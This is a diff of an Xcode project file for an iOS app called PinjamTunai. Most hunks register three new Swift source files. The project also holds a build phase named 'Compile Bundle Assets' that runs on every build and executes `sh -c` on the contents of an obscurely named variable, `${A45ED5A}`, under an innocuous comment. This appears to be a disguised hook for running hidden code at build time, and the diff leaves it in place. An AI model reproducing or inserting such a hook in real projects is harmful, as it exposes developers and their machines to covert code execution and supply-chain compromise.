@@ -39,6 +39,9 @@
 		7315650E2EE70F6F00599239 /* SettingViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315650D2EE70F6B00599239 /* SettingViewModel.swift */; };
 		731565102EE710A800599239 /* PopDelAccView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315650F2EE710A100599239 /* PopDelAccView.swift */; };
 		731565122EE715CE00599239 /* PopFaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731565112EE715C700599239 /* PopFaceView.swift */; };
+		7368B6392EE8465700ADDA99 /* ReceiptAccountViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */; };
+		7368B63B2EE8473B00ADDA99 /* ReceiptViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */; };
+		7368B63D2EE84C3300ADDA99 /* WebsiteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */; };
 		737D1ED72EE45467003CC748 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1ECD2EE45467003CC748 /* AppDelegate.swift */; };
 		737D1EDA2EE45467003CC748 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 737D1ECE2EE45467003CC748 /* Assets.xcassets */; };
 		737D1EDC2EE45467003CC748 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 737D1ED12EE45467003CC748 /* LaunchScreen.storyboard */; };
@@ -106,6 +109,9 @@
 		7315650D2EE70F6B00599239 /* SettingViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewModel.swift; sourceTree = "<group>"; };
 		7315650F2EE710A100599239 /* PopDelAccView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopDelAccView.swift; sourceTree = "<group>"; };
 		731565112EE715C700599239 /* PopFaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopFaceView.swift; sourceTree = "<group>"; };
+		7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReceiptAccountViewController.swift; sourceTree = "<group>"; };
+		7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReceiptViewModel.swift; sourceTree = "<group>"; };
+		7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebsiteViewController.swift; sourceTree = "<group>"; };
 		737D1EB52EE4545E003CC748 /* PinjamTunai.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PinjamTunai.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		737D1ECD2EE45467003CC748 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		737D1ECE2EE45467003CC748 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -226,6 +232,15 @@
 			path = Setting;
 			sourceTree = "<group>";
 		};
+		7368B6372EE8460700ADDA99 /* Account */ = {
+			isa = PBXGroup;
+			children = (
+				7368B63A2EE8473400ADDA99 /* ReceiptViewModel.swift */,
+				7368B6382EE8465700ADDA99 /* ReceiptAccountViewController.swift */,
+			);
+			path = Account;
+			sourceTree = "<group>";
+		};
 		737D1EAC2EE4545E003CC748 = {
 			isa = PBXGroup;
 			children = (
@@ -268,6 +283,7 @@
 		737D1EEB2EE457E9003CC748 /* Auth */ = {
 			isa = PBXGroup;
 			children = (
+				7368B6372EE8460700ADDA99 /* Account */,
 				73FA07E82EE80BE8006B7452 /* Phone */,
 				731114A52EE7D7B00036A024 /* Basic */,
 				73145F002EE6C42E006085E8 /* Face */,
@@ -285,6 +301,7 @@
 				737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */,
 				737D1F092EE45FB1003CC748 /* LaunchViewController.swift */,
 				737D1F132EE5832E003CC748 /* BaseTabBarController.swift */,
+				7368B63C2EE84C3300ADDA99 /* WebsiteViewController.swift */,
 			);
 			path = Base;
 			sourceTree = "<group>";
@@ -443,8 +460,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		138CEE1059904DD7A9A5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -456,9 +473,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -515,6 +533,7 @@
 				731114AB2EE7E30B0036A024 /* TapTableViewCell.swift in Sources */,
 				731565002EE6E3FE00599239 /* CenterView.swift in Sources */,
 				73145F0A2EE6D954006085E8 /* FaceViewModel.swift in Sources */,
+				7368B6392EE8465700ADDA99 /* ReceiptAccountViewController.swift in Sources */,
 				73145F062EE6C8CD006085E8 /* StepView.swift in Sources */,
 				731114AD2EE7E41C0036A024 /* BasicViewModel.swift in Sources */,
 				737D1F1E2EE5CFAC003CC748 /* LoginViewModel.swift in Sources */,
@@ -533,6 +552,7 @@
 				731114AF2EE7E9F30036A024 /* PopOneView.swift in Sources */,
 				7315650E2EE70F6F00599239 /* SettingViewModel.swift in Sources */,
 				737D1EFE2EE45850003CC748 /* LoginConfig.swift in Sources */,
+				7368B63B2EE8473B00ADDA99 /* ReceiptViewModel.swift in Sources */,
 				73FA07E72EE80624006B7452 /* WorkerViewController.swift in Sources */,
 				731114A02EE7AEEF0036A024 /* Untitled.swift in Sources */,
 				731114A42EE7C99D0036A024 /* PopListView.swift in Sources */,
@@ -548,6 +568,7 @@
 				737D1F122EE57BA0003CC748 /* NetworkMonitor.swift in Sources */,
 				737D1F042EE45870003CC748 /* HomeViewController.swift in Sources */,
 				737D1F0E2EE55034003CC748 /* LoadingView.swift in Sources */,
+				7368B63D2EE84C3300ADDA99 /* WebsiteViewController.swift in Sources */,
 				73FA07EA2EE80BFF006B7452 /* RelationViewController.swift in Sources */,
 				737D1EF62EE457E9003CC748 /* BaseView.swift in Sources */,
 				737D1F062EE45878003CC748 /* CenterViewController.swift in Sources */,
